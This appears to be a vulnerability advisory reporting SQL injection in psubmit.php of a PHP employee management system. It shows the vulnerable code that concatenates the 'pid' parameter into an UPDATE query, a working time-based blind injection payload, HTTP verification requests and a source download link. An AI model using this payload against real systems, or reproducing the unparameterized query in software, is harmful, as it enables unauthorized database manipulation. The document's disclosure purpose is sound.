## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/psubmit.php` contains a SQL Injection vulnerability (time-based blind may be used for verification in authorized testing)

Impact of the vulnerability
The application concatenates user-controlled input into an SQL `UPDATE` statement without parameterization. This may allow an attacker to:

- Manipulate database queries/updates (unauthorized project status changes, depending on DB permissions)
- Infer database behavior/data using blind techniques
- Potentially impact integrity/availability of the application data

### Payload:

213'and(select*from(select+sleep(10))a/**/union/**/select+1)='

```
213'and(select*from(select+sleep(10))a/**/union/**/select+1)='
```

### POC:

The vulnerable endpoint is `GET /psubmit.php?pid=...&id=...`. The `pid` parameter is directly embedded into an SQL query:

$pid = $_GET['pid'];

$id = $_GET['id'];

$date = date('Y-m-d');

$sql = "UPDATE `project` SET `subdate`='$date',`status`='Submitted' WHERE pid = '$pid';";

$result = mysqli_query($conn , $sql);

header("Location: empproject.php?id=$id");

- Baseline request (normal response time; returns a redirect):

GET /psubmit.php?pid=213&id=101 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

- Time-delay verification request (in an authorized test environment, provide a URL-encoded time-delay expression via `pid`; the application still returns a redirect after executing the SQL):

GET /psubmit.php?pid=<URL_ENCODED_TIME_DELAY_PAYLOAD>&id=101 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
Compared to the baseline, the verification request responds noticeably slower by approximately `<DELAY_SECONDS>`, then returns `302 Found` with a `Location: empproject.php?id=101` redirect, indicating the injected input affected database execution.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409160527746](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409160527746.png)